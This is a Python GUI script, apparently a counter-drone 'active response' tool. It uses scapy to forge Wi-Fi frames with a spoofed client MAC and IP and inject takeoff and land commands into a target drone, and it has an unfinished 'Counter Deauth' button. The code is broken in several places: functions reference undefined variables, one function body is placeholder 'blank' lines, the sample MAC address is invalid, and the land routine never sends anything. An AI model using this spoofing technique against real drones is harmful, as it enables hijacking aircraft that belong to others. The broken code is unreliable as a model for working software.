import customtkinter as ctk
import socket
import time
import json
import ipaddress
import threading
from scapy.all import RadioTap, Dot11, LLC, SNAP, IP, UDP, sendp

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

# GUI background
app = ctk.CTk()
app.title("Drone Deauth Active Response Module")
app.geometry("600x400")


def load_drone_json(filepath='drones.json'):
    try:
        with open(filepath,'r') as file:
            return json.load(file)
    # Check if the json config file is here. 
    # It records the Drone's profile data.
    # The details of the json content are in the readme file under "Drone-Deauth-Detect-And-Response-System" folder.  
    except FileNotFoundError:
        status_label.configure(text=f'No json config file found.')
    except json.JSONDecodeError:
        status_label.configure(text=f'Wrong file format. It should be json file')



def active_response_land(drone_model=None, custom_ip=None):
    profiles = load_drone_json()
    if "Error" in profiles:
        status_label.configure(text=f"Error: {profiles['Error']}", text_color="red")
        return
    if drone_model not in profiles:
        status_label.configure(text="Error: Cannot find drone_model in json.", text_color="red")
        return

    profile = profiles[drone_model]
    
    target_mac = profile.get("mac_address")
    if not target_mac:
        status_label.configure(text="Error: Missing mac_address in JSON. Aborting.", text_color="red")
        return

    iface = profile.get("interface", "wlan0")
    target_ip = custom_ip if custom_ip else profile.get("default_ip", "1.2.3.4")
    target_port = profile.get("port", 1234)

    fake_client_mac = "00:AB:CD:EF:GH:IJ" 
    fake_client_ip = "1.2.3.4"

    status_label.configure(text=f"\n Will send active defense land command")

def send_scapy_cmd(cmd_str):
    profiles=load_drone_json()   
    if drone_model is None:
        status_label.configure(text="Please provide drone_model in the json config file.")
        return
    
    # drone_model is absent in the json config file.
    if drone_model not in profiles:
        status_label.configure(f'Cannot find drone_model in json config file.')
        return
    
    profile=profiles[drone_model]
    dot11 = Dot11(type=2, subtype=0, addr1=target_mac, addr2=fake_client_mac, addr3=target_mac)
    
    pkt = RadioTap() / dot11 / LLC() / SNAP() / IP(src=fake_client_ip, dst=target_ip) / UDP(sport=8889, dport=target_port) / cmd_str
        
    sendp(pkt, iface=iface, verbose=False)


    try:
        if profile.get("initial_command"):
            status_label.configure(text="send intial command")
            # Change string into UTF-8
            initial_bytes=profile["initial_command"].encode('utf-8')
            sock.sendto(initial_bytes,(target_ip,target_port))
            time.sleep(0.5)

        if profile.get("land_cmd"):
            status_label.configure(text="Send land command now")
            land_bytes=profile["land_cmd"].encode('utf-8')
            sock.sendto(land_bytes, (target_ip,target_port))
            status_label.configure(text="Land command sent successfully")
        
        else:
             status_label.configure(text="Json config file has no land commond")
    except Exception as e:
         status_label.configure(text=f"Unsuccess : {e}")


    finally:
        sock.close()

def btn_trigger_land():

    selected_drone = drone_combo.get()
    input_ip = ip_entry.get()
    final_ip = input_ip if input_ip.strip() != "" else None 
    threading.Thread(target=active_response_land, args=(selected_drone, final_ip), daemon=True).start()

def counter_deauth():
    blank
    blank
    blank
    blank
    blank

def btn_trigger_counter():
    threading.Thread(target=counter_deauth, daemon=True).start()

title_label = ctk.CTkLabel(app, text="Active Defense Response System", font=("Arial", 24, "bold"))
title_label.pack(pady=(20, 10))

status_label = ctk.CTkLabel(app, text="Status: Standby", text_color="white", font=("Arial", 16))
status_label.pack(pady=(0, 20))

drone_data = load_drone_json()
drone_list = list(drone_data.keys()) if "Error" not in drone_data else ["DRONE1"]

drone_combo = ctk.CTkComboBox(app, values=drone_list, width=200)
drone_combo.pack(pady=10)
if drone_list:
    drone_combo.set(drone_list[0])

ip_entry = ctk.CTkEntry(app, placeholder_text="Custom IP (Optional)", width=200)
ip_entry.pack(pady=10)

land_btn = ctk.CTkButton(app, text="EMERGENCY LAND", fg_color="red", hover_color="darkred", 
                         font=("Arial", 20, "bold"), height=50, command=btn_trigger_land)
land_btn.pack(pady=30)
counter_btn = ctk.CTkButton(app, text="Counter Deauth!", 
                            fg_color="orange", hover_color="darkorange", 
                            font=("Arial", 16, "bold"), height=40, command=btn_trigger_counter)
counter_btn.pack(pady=10)
app.mainloop()